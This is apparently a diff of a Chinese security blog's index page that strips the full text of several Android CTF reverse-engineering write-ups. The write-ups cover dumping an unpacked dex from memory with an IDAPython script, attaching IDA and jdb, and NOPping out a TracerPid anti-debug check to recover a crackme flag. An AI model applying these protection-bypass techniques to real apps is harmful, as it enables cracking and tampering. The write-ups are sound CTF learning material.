class="comment">/*</span></span><br><span class="line"><span class="comment">     * Prep the VM and perform the optimization.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dvmPrepForDexOpt(bootClassPath, dexOptMode, verifyMode,</span><br><span class="line">            dexoptFlags) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGE(<span class="string">"DexOptZ: VM init failed"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//vmStarted = 1;</span></span><br><span class="line">    <span class="comment">/* do the optimization */</span></span><br><span class="line">    <span class="keyword">if</span> (!dvmContinueOptimization(cacheFd, dexOffset, uncompLen, debugFileName,</span><br><span class="line">            modWhen, crc32, isBootstrap))</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGE(<span class="string">"Optimization failed"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>dvmContinueOptimization函数位于/dalvik/vm/analysis/DexPrepare.cpp文件,其中调用了dvmDexFileOpenPartial.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Do the actual optimization. This is executed in the dexopt process.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For best use of disk/memory, we want to extract once and perform</span></span><br><span class="line"><span class="comment"> * optimizations in place. If the file has to expand or contract</span></span><br><span class="line"><span class="comment"> * to match local structure padding/alignment expectations, we want</span></span><br><span class="line"><span class="comment"> * to do the rewrite as part of the extract, rather than extracting</span></span><br><span class="line"><span class="comment"> * into a temp file and slurping it back out. (The structure alignment</span></span><br><span class="line"><span class="comment"> * is currently correct for all platforms, and this isn't expected to</span></span><br><span class="line"><span class="comment"> * change, so we should be okay with having it already extracted.)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns "true" on success.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dvmContinueOptimization</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">off_t</span> dexOffset, <span class="keyword">long</span> dexLength,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* fileName, u4 modWhen, u4 crc, <span class="keyword">bool</span> isBootstrap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   ...</span><br><span class="line">        success = rewriteDex(((u1*) mapAddr) + dexOffset, dexLength,</span><br><span class="line">                    doVerify, doOpt, &amp;pClassLookup, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (success) &#123;</span><br><span class="line">            DvmDex* pDvmDex = <span class="literal">NULL</span>;</span><br><span class="line">            u1* dexAddr = ((u1*) mapAddr) + dexOffset;</span><br><span class="line">            <span class="keyword">if</span> (dvmDexFileOpenPartial(dexAddr, dexLength, &amp;pDvmDex) != <span class="number">0</span>) &#123;</span><br><span class="line">                ALOGE(<span class="string">"Unable to create DexFile"</span>);</span><br><span class="line">                success = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>dvmDexFileOpenPartial调用了dexFileParse,用来解析内存中优化过或未优化过的dex文件,返回dexFile结构.<br>所以此时dex文件已经被加载进内存,就可以dump出来了.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Create a DexFile structure for a "partial" DEX. This is one that is in</span></span><br><span class="line"><span class="comment"> * the process of being optimized. The optimization header isn't finished</span></span><br><span class="line"><span class="comment"> * and we won't have any of the auxillary data tables, so we have to do</span></span><br><span class="line"><span class="comment"> * the initialization slightly differently.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns nonzero on error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dvmDexFileOpenPartial</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* addr, <span class="keyword">int</span> len, DvmDex** ppDvmDex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DvmDex* pDvmDex;</span><br><span class="line">    DexFile* pDexFile;</span><br><span class="line">    <span class="keyword">int</span> parseFlags = kDexParseDefault;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/* -- file is incomplete, new checksum has not yet been calculated</span></span><br><span class="line"><span class="comment">    if (gDvm.verifyDexChecksum)</span></span><br><span class="line"><span class="comment">        parseFlags |= kDexParseVerifyChecksum;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pDexFile = dexFileParse((u1*)addr, len, parseFlags);</span><br><span class="line">    <span class="keyword">if</span> (pDexFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">"DEX parse failed"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="赛题分析"><a href="#赛题分析" class="headerlink" title="赛题分析"></a>赛题分析</h2><h3 id="jeb打开apk，查看Manifest"><a href="#jeb打开apk，查看Manifest" class="headerlink" title="jeb打开apk，查看Manifest"></a>jeb打开apk，查看Manifest</h3><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fo0bvqfxcnj31je0ngacl.jpg" alt=""></p>
-<h3 id="反编译查看源代码"><a href="#反编译查看源代码" class="headerlink" title="反编译查看源代码"></a>反编译查看源代码</h3><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fo0bzdzyitj31d00oewg7.jpg" alt=""></p>
-<h3 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h3><p>asset目录中的jar文件被处理了，打不开，也不知道处理逻辑<br>libs目录中的三个so文件，唯一加载了libmobisec.so文件了<br>所以说被加固的源程序可能存在于so文件，也可能存在于asset文件里。</p>
-<h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><h3 id="得到libdvm-so文件"><a href="#得到libdvm-so文件" class="headerlink" title="得到libdvm.so文件"></a>得到libdvm.so文件</h3><p><code>adb pull /system/lib/libdvm.so</code></p>
-<h3 id="在dvmDexFileOpenPartial下断点"><a href="#在dvmDexFileOpenPartial下断点" class="headerlink" title="在dvmDexFileOpenPartial下断点"></a>在dvmDexFileOpenPartial下断点</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0c9qazoaj30x409ltck.jpg" alt=""></p>
-<h3 id="IDA-attach并断下"><a href="#IDA-attach并断下" class="headerlink" title="IDA attach并断下"></a>IDA attach并断下</h3><p>adb shell am start -D -n com.ali.tg.testapp/.MainActivity<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0cmoer7bj30zl073gp5.jpg" alt=""><br>dvmDexFileOpenPartial函数的第一个参数就是dex内存起始地址，第二个参数就是dex大小。<br>R0:0x753EF008<br>R1:0x000941FC</p>
-<h3 id="dump脚本"><a href="#dump脚本" class="headerlink" title="dump脚本"></a>dump脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line">start_addr=<span class="number">0x753EF008</span></span><br><span class="line">fike_len=<span class="number">0x000941FC</span></span><br><span class="line">data=idaapi.dbg_read_memory(start_addr,fike_len)</span><br><span class="line">f=open(<span class="string">r'dump.dex'</span>,<span class="string">'wb'</span>)</span><br><span class="line">f.write(data)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0cpgd28kj30zu0n4wjs.jpg" alt=""></p>
-<h3 id="反编译dex为smali，进行分析"><a href="#反编译dex为smali，进行分析" class="headerlink" title="反编译dex为smali，进行分析"></a>反编译dex为smali，进行分析</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0d78f8gsj31im0xy41l.jpg" alt=""></p>
-
-          
+          前置知识http://www.wjdiankong.cn/android中的apk的加固加壳原理解析和实现/http://blog.csdn.net/jiangwei0910410003/article/details/48104581
+赛题链接https://github.com/eternals
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/02/01/ALICTF_evalapk_3/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1225,7 +1281,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/sakura_heart.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -1287,6 +1343,17 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/01/30/android_trick1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/01/30/android_trick1/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -1313,16 +1380,16 @@
       
         
           
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在很多APK都设置android:debugable=”false”，经常需要改xml的application后重打包。<br>所以这里使用Xposed来Hook配置信息修改debugger值。<br>使用前手机已root,且安装Xposed,然后在“模块”中勾选BDOpener<br><a href="https://security.tencent.com/index.php/opensource/detail/17" target="_blank" rel="noopener">BDOpener下载链接</a></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>在手机上安装待调试的程序，然后在开发者选项设置里“选择待调试的应用程序”选项，勾选“等待调试器”选项，之后打开调试程序。<br>待调试器加载它。<br>使用日志：<img src="https://ws4.sinaimg.cn/large/006tNc79ly1fnygwv23j9j316c0b20yl.jpg" alt=""></p>
-<h2 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h2><p>关于动态调试可以参考我的这篇文章：<br><a href="http://eternalsakura13.com/2018/01/30/ali_re2/">http://eternalsakura13.com/2018/01/30/ali_re2/</a><br>有变动的地方就是不需要修改debugger值后重打包apk，也不再需要用<code>adb shell am start -D -n com.yaotong.crackme/.MainActivity</code>来启动要调试的apk<br>只需要按照上面描述的方法在手机上手动按一次就好了。<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fnyhc72031j30c20kumzw.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fnyhd13d8bj30by0l8wfw.jpg" alt=""></p>
-<h2 id="一些操作"><a href="#一些操作" class="headerlink" title="一些操作"></a>一些操作</h2><h3 id="手动打开apk"><a href="#手动打开apk" class="headerlink" title="手动打开apk"></a>手动打开apk</h3><p>日志<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fnyh5t87s7j314k07mq7g.jpg" alt=""></p>
-<h3 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fnyh1piu9tj30pe09b768.jpg" alt=""></p>
-<h3 id="设置好IDA-process-option并attach上去，断在libc里"><a href="#设置好IDA-process-option并attach上去，断在libc里" class="headerlink" title="设置好IDA process option并attach上去，断在libc里"></a>设置好IDA process option并attach上去，断在libc里</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fnyh2jf5wmj30fi040dgf.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fnyh319tohj30g8057dgz.jpg" alt=""></p>
-<h3 id="在控制台使用jdb恢复进程运行"><a href="#在控制台使用jdb恢复进程运行" class="headerlink" title="在控制台使用jdb恢复进程运行"></a>在控制台使用jdb恢复进程运行</h3><p><code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code><br>按下F9，顺利断下。<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fnyh5au2w1j30ce03wwf1.jpg" alt=""></p>
-<h3 id="再次调试"><a href="#再次调试" class="headerlink" title="再次调试"></a>再次调试</h3><p>IDA调试结束后，apk回到waiting for debugger状态，等待下一次被attach<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fnyhd13d8bj30by0l8wfw.jpg" alt=""></p>
-
-          
+          前言现在很多APK都设置android:debugable=”false”，经常需要改xml的application后重打包。所以这里使用Xposed来Hook配置信息修改debugger值。使用前手机已root,且安装Xposed,然后在“模块”中勾选BDOpenerBDOpener下载链接
+使用
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/01/30/android_trick1/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1374,7 +1441,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/sakura_heart.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -1447,6 +1514,17 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/01/30/ctf_ali2/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/01/30/ctf_ali2/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -1473,30 +1551,16 @@
       
         
           
-            <h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/AliCrackme_2.apk" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/AliCrackme_2.apk</a></p>
-<h2 id="反调试原理"><a href="#反调试原理" class="headerlink" title="反调试原理"></a>反调试原理</h2><h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><p>ptrace提供了一种使父进程得以监视和控制其它进程的方式，它还能够改变子进程中的寄存器和内核映像，因而可以实现断点调试和系统调用的跟踪。<br>在执行系统调用之前，内核会先检查当前进程是否处于被“跟踪”(traced)的状态。如果是的话，内核<strong>暂停当前进程并将控制权交给跟踪进程</strong>，使跟踪进程得以察看或者修改被跟踪进程的寄存器。</p>
-<h3 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h3><p>用fopen打开/proc/<pid>/status文件读取其中的TracerPid值来检测自己的进程是否被attach，<br>TracerPid如果为0说明没有别的进程在调试这个进程，如果不为0说明有程序在调试</pid></p>
-<h3 id="反调试程序执行时机"><a href="#反调试程序执行时机" class="headerlink" title="反调试程序执行时机"></a>反调试程序执行时机</h3><ul>
-<li>.init_array是一个so最先加载的一个段信息，时机最早，现在一般so解密操作都是在这里做的</li>
-<li>JNI_OnLoad是so被System.loadLibrary调用的时候执行，它的时机要早于哪些native方法执行，但是没有.init_array时机早</li>
-</ul>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="连接到实体机，打开监听"><a href="#连接到实体机，打开监听" class="headerlink" title="连接到实体机，打开监听"></a>连接到实体机，打开监听</h3><p><code>./android_server</code><br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny05kit55j30et03x0tc.jpg" alt=""><br>这里开始监听设备的23946端口。</p>
-<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>如果要想让IDA和这个android_server进行通信，那么必须让PC端的IDA也连上这个端口<br>adb forward tcp:远端设备端口号(进行调试程序端) tcp:本地设备端口(被调试程序端)<br><code>adb forward tcp:23946 tcp:23946</code></p>
-<h3 id="打开要调试的apk，找到入口"><a href="#打开要调试的apk，找到入口" class="headerlink" title="打开要调试的apk，找到入口"></a>打开要调试的apk，找到入口</h3><p><code>adb shell dumpsys activity top</code><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny0bll6ovj30gi04nt9o.jpg" alt=""></p>
-<h3 id="打开monitor"><a href="#打开monitor" class="headerlink" title="打开monitor"></a>打开monitor</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0c5a6y0j31kw0m3nio.jpg" alt=""></p>
-<h3 id="启动apk"><a href="#启动apk" class="headerlink" title="启动apk"></a>启动apk</h3><p><code>adb shell am start -D -n com.yaotong.crackme/.MainActivity</code><br>设备将处于一个Waiting For Debugger的状态</p>
-<h3 id="在要调试的函数下断点，这里我们在JNI-OnLoad下断。"><a href="#在要调试的函数下断点，这里我们在JNI-OnLoad下断。" class="headerlink" title="在要调试的函数下断点，这里我们在JNI_OnLoad下断。"></a>在要调试的函数下断点，这里我们在JNI_OnLoad下断。</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0l03rv2j31kw0n54d1.jpg" alt=""></p>
-<h3 id="设置IDA"><a href="#设置IDA" class="headerlink" title="设置IDA"></a>设置IDA</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0eyg040j318a14otra.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny0fqqwhcj30ue0nuq8u.jpg" alt=""></p>
-<h3 id="attach进程"><a href="#attach进程" class="headerlink" title="attach进程"></a>attach进程</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny0hgcahsj30ks0netg9.jpg" alt=""><br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0gyl380j30xc0qw7c7.jpg" alt=""><br>断在libc.so<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0i5xmklj31h80ponbm.jpg" alt=""><br><strong>tips:这里为什么会断在libc.so中呢</strong><br>android系统中libc是c层中最基本的函数库，libc中封装了io、文件、socket等基本系统调用。所有上层的调用都需要经过libc封装层。所以libc.so是最基本的，所以会断在这里，而且我们还需要知道一些常用的系统so,比如linker</p>
-<h3 id="在控制台使用jdb恢复进程运行"><a href="#在控制台使用jdb恢复进程运行" class="headerlink" title="在控制台使用jdb恢复进程运行"></a>在控制台使用jdb恢复进程运行</h3><p><code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code><br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0nb9v75j30g001wglx.jpg" alt=""><br>按下F9执行程序<br>弹出窗口，这里是问apk里的so文件和我们正在调试的是否是同一个，当然是same<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny0nt58mtj31kw0b647j.jpg" alt=""><br>正常情况会出现:<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0ovayd9j30fm02ymxn.jpg" alt=""><br>报错处理：<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0q9s9rhj30gb0ajjtg.jpg" alt=""></p>
-<ul>
-<li>打开ddms尝试.</li>
-<li>检查调试的app配置文件中是否有android:debuggable=”true”，导致不能调试。若无则在清单文件的application中加上,重新打包即可.<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny0r84fb2j31jk0esq4l.jpg" alt=""><h3 id="JNI-OnLoad中单步调试找到check点"><a href="#JNI-OnLoad中单步调试找到check点" class="headerlink" title="JNI_OnLoad中单步调试找到check点"></a>JNI_OnLoad中单步调试找到check点</h3>函数顺利断下<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0rp83etj31fc0ou4d8.jpg" alt=""><br>F8单步找到Check点<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fnxzwyv4xkj316w0eyk0b.jpg" alt=""><br>执行<code>BLX R7</code>之后就跳入libc中断<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny03c4jhmj314609e79b.jpg" alt=""><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0utqfacj30ye08yjwd.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny0wnijqoj30yi0fe10x.jpg" alt=""><br>反编译一下，找到BLX R7那行函数,这个函数就是pthread_create,它调用sub_16A4<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny1sdzxa9j31je13sqk3.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny1sltzepj30tg0aiq4y.jpg" alt=""><br><strong>进入sub_16A4,它调用sub_130C，在这里进行反调试，所以我们只需要把它nop即可</strong><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny1trsaaaj30gy0a0myo.jpg" alt=""><h3 id="另外的一些分析"><a href="#另外的一些分析" class="headerlink" title="另外的一些分析"></a>另外的一些分析</h3>在module list里找到libc.so，再从中找到fopen函数<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny15obitcj30uc0ja11i.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny16bi70tj31160dsaea.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny16yfq3yj30uk0koq70.jpg" alt=""><br>在fopen断下之后，查看hex窗口<br>（在这之前需要先设置hex数据与R0同步）<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny1aniwolj30y00j444r.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny19n03wej317e0wsk8v.jpg" alt=""><br>查看一下这个8358进程是什么，果然是我们的crack apk，再看看它的status，发现被trace了<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny1eyodbcj30fw06omy2.jpg" alt=""><br>这个trace的进程就是我们的android_server<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny1g5po07j30et01bwel.jpg" alt=""></li>
-</ul>
-<h3 id="patch-so"><a href="#patch-so" class="headerlink" title="patch so"></a>patch so</h3><p>arm中对应的nop指令是：00 00 00 00<br>我们可以选择nop掉BL sub_130C,或者直接nop掉BLX R7，这里我们nop后者<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny2rrr0gdj30zw0p87io.jpg" alt=""><br>数据窗口中跟随，按F2去编辑<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny2sxbvkvj311y12kh53.jpg" alt=""><br>修改并保存<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny2u9p4oqj314i0ow14u.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny2ut0of2j30xq0y84g4.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny32s8rw5j30sq0i0jvt.jpg" alt=""><br><strong>感觉IDA的patch并不是很好用，所以我们记下地址后用010editor打开修改更好</strong><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny3cp95etj30uw08ftd1.jpg" alt=""><br>将原apk中的so文件替换为此so文件,重新打包签名安装,现在直接打开app调试就不会退出了. Success!</p>
-<h2 id="securityCheck"><a href="#securityCheck" class="headerlink" title="securityCheck"></a>securityCheck</h2><h3 id="找到securityCheck函数下断"><a href="#找到securityCheck函数下断" class="headerlink" title="找到securityCheck函数下断"></a>找到securityCheck函数下断</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny3joou5bj30ps0gp0w5.jpg" alt=""><br>输入密码后断下<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny3qea9cwj30kg07v41b.jpg" alt=""><br>剩下的就是很简单的比较<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny3u79wd5j30g207v764.jpg" alt=""><br>直接找到密码，over~<br>flag是aiyou,bucuoo</p>
-
-          
+          题目链接https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/AliCrackme_2.apk
+反调试原理ptraceptrace提供了一种使父进程得以监视和控制其它进程的方式，它还能够改变子进程中的寄存器和内核映像，因而可以实
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/01/30/ctf_ali2/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1548,7 +1612,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/sakura_heart.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -1610,6 +1674,17 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/01/30/ali_re2/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/01/30/ali_re2/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -1636,30 +1711,16 @@
       
         
           
-            <h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/AliCrackme_2.apk" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/AliCrackme_2.apk</a></p>
-<h2 id="反调试原理"><a href="#反调试原理" class="headerlink" title="反调试原理"></a>反调试原理</h2><h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><p>ptrace提供了一种使父进程得以监视和控制其它进程的方式，它还能够改变子进程中的寄存器和内核映像，因而可以实现断点调试和系统调用的跟踪。<br>在执行系统调用之前，内核会先检查当前进程是否处于被“跟踪”(traced)的状态。如果是的话，内核<strong>暂停当前进程并将控制权交给跟踪进程</strong>，使跟踪进程得以察看或者修改被跟踪进程的寄存器。</p>
-<h3 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h3><p>用fopen打开/proc/<pid>/status文件读取其中的TracerPid值来检测自己的进程是否被attach，<br>TracerPid如果为0说明没有别的进程在调试这个进程，如果不为0说明有程序在调试</pid></p>
-<h3 id="反调试程序执行时机"><a href="#反调试程序执行时机" class="headerlink" title="反调试程序执行时机"></a>反调试程序执行时机</h3><ul>
-<li>.init_array是一个so最先加载的一个段信息，时机最早，现在一般so解密操作都是在这里做的</li>
-<li>JNI_OnLoad是so被System.loadLibrary调用的时候执行，它的时机要早于哪些native方法执行，但是没有.init_array时机早</li>
-</ul>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="连接到实体机，打开监听"><a href="#连接到实体机，打开监听" class="headerlink" title="连接到实体机，打开监听"></a>连接到实体机，打开监听</h3><p><code>./android_server</code><br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny05kit55j30et03x0tc.jpg" alt=""><br>这里开始监听设备的23946端口。</p>
-<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>如果要想让IDA和这个android_server进行通信，那么必须让PC端的IDA也连上这个端口<br>adb forward tcp:远端设备端口号(进行调试程序端) tcp:本地设备端口(被调试程序端)<br><code>adb forward tcp:23946 tcp:23946</code></p>
-<h3 id="打开要调试的apk，找到入口"><a href="#打开要调试的apk，找到入口" class="headerlink" title="打开要调试的apk，找到入口"></a>打开要调试的apk，找到入口</h3><p><code>adb shell dumpsys activity top</code><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny0bll6ovj30gi04nt9o.jpg" alt=""></p>
-<h3 id="打开monitor"><a href="#打开monitor" class="headerlink" title="打开monitor"></a>打开monitor</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0c5a6y0j31kw0m3nio.jpg" alt=""></p>
-<h3 id="启动apk"><a href="#启动apk" class="headerlink" title="启动apk"></a>启动apk</h3><p><code>adb shell am start -D -n com.yaotong.crackme/.MainActivity</code><br>设备将处于一个Waiting For Debugger的状态</p>
